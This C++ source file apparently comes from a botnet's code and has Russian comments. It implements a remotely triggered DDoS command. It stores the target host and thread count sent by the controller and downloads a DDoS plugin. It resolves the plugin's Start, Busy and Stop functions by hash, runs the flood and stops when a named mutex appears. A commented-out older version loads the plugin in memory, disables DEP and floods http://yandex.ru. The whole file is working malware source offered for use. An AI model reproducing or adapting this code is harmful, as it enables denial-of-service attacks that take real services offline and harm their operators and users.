#include "ddos.h"
#include "Plugins.h"
#include "Utils.h"
#include "StrConsts.h"
#include "BotCore.h"
#include "Inject.h"


//----------------------------------------------------------------------------
//  Функция процесса для работы DDOS
//----------------------------------------------------------------------------
DWORD WINAPI DDOSProces(LPVOID)
{
	#define Exit { return 0; pExitProcess(0); }

	BOT::Initialize();

	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
	DWORD Sz = 0;
	PCHAR Args = (PCHAR)File::ReadToBufferA(FileName.t_str(), Sz);

	if (STRA::IsEmpty(Args)) Exit;

	// Получаем параметры команды

	PCHAR Host       = STR::GetLeftStr(Args, " ");
	if (STRA::IsEmpty(Host))
		Host = STR::New(Args);

	PCHAR StrThreads = STR::GetRightStr(Args, " ");

	int Count = StrToInt(StrThreads);

    MemFree(Args);

	// Загружаем плагин
	TPlugin Plugin(GetStr(EStrDDOSPlugin));

	if (!Plugin.Download(true)) Exit;




	// Запускаем DDOS атаку
	typedef int  (WINAPI *TStart)(char*, DWORD, DWORD, DWORD);
	typedef BOOL (WINAPI *TBusy)();
	typedef void (WINAPI *TStop)();


	TStart Start;
	TBusy  Busy;
	TStop  Stop;

	if (!Plugin.GetProcAddress(0x3E987971 /* Start */, (LPVOID&)Start) ||
		!Plugin.GetProcAddress(0x85D79F9 /* Busy */, (LPVOID&)Busy) ||
		!Plugin.GetProcAddress(0xA7D37F0 /* Stop */, (LPVOID&)Stop))
	{
		Exit;
	}


	string MutexName = GetStr(EStrDDOSSignal);

	// Стартуем
	if (Start(Host, Count, 0, 0) == 0)
	{
		// Переходим в режим ожидания команды стоп
		while (Busy())
		{
			HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName.t_str());
			if (Handle)
            {
				// Команда получена, плавно прекращаем работу
				Stop();
				DWORD St = (DWORD)pGetTickCount();
				while (Busy() && (DWORD)pGetTickCount() - St < 5000) pSleep(100);
				pCloseHandle(Handle);
				break;
			}

			pSleep(300);
		}
	}

    // Освобождаем данные
	STR::Free(Host);
	STR::Free(StrThreads);

	Exit;
}



//----------------------------------------------------------------------------
//  Команда запускает процесс DDOS атаки
//----------------------------------------------------------------------------
bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	if (STRA::IsEmpty(Args)) return false;

	//Проверем на предмет необходимости остановки
	#define COMMAND_STOP 0xE7D37F0 /* stop */

	if (STRA::Hash(Args, 0, true) == COMMAND_STOP)
	{
		HANDLE Handle=(HANDLE)pCreateMutexA(NULL, false, GetStr(EStrDDOSSignal).t_str());
		pSleep(3000);
		pCloseHandle(Handle);
		return true;
	}

	// ------ Запускаем процесс --------

	// Сохраняем аргументы команды
	string FileName = Bot->MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());

	DWORD Len = STRA::Length(Args) + 1;
	if (File::WriteBufferA(FileName.t_str(), Args, Len) != Len)
		return false;


	// Запускаем процесс
	return MegaJump(DDOSProces);

//	return (StartThread(DDOSProces, NULL)) ? true : false;
}




/*

typedef struct
{
	char* URL;
	char* Count;
	
} DDos, * PDDos;

DWORD WINAPI RunDDOSThread( LPVOID lpData )
{
	DisableDEP();

	if ( !lpData )
	{
		return 0;
	}

	PDDos pData = (PDDos)lpData;



	char DDOSPlugin[] = {'d','d','o','s','.','p','l','u','g',0};


	DWORD dwModuleSize = 0;
	LPBYTE BotModule   = Plugin::Download(DDOSPlugin, NULL, &dwModuleSize);
	if (BotModule == NULL)
		return 0;


//	PCHAR FN = "c:\\temp\\ddos.dll";
//	File::WriteBufferA(FN, BotModule,  dwModuleSize);
//	LoadLibraryA(FN);


	int Count = m_atoi(pData->Count);
	HMEMORYMODULE HHandle = MemoryLoadLibrary(BotModule);
	typedef int (WINAPIV*TMethod)(char*,int);
	TMethod M = (TMethod)MemoryGetProcAddress(HHandle, (PCHAR)"StartHTTP");
	int R;
	if (M != NULL) 
		R = M("http://yandex.ru\0", Count);

	HANDLE tmp;
	while ( 1 )// ждем команды на выключение
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,false, "DDOS");
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{
			pSleep(100);
		}
		else break;
	}

	
	M(pData->URL,0);//вызываем эту же функцию с другими параметрами
	pCloseHandle(tmp);
	MemFree(BotModule);
	STR::Free(pData->URL);
	STR::Free(pData->Count);
	
	
	return 0;

}

bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
		// Запуск потока DDOS
	PCHAR Argums = Args;
	PDDos V = CreateStruct(DDos);
	if (Args[0]=='s'&&Args[1]=='t'&&Args[2]=='o'&&Args[3]=='p')
	{
		HANDLE MutexHandle=(HANDLE)pCreateMutexA(NULL,false,"DDOS");//прекращаем ддос
		pSleep(1000); 
		pCloseHandle(MutexHandle);
	}

	V->URL=STR::GetLeftStr(Argums, " ");
	V->Count=STR::GetRightStr(Argums, " ");

	   
	return ((StartThread(RunDDOSThread, V)) ? (true) : (false));


}

*/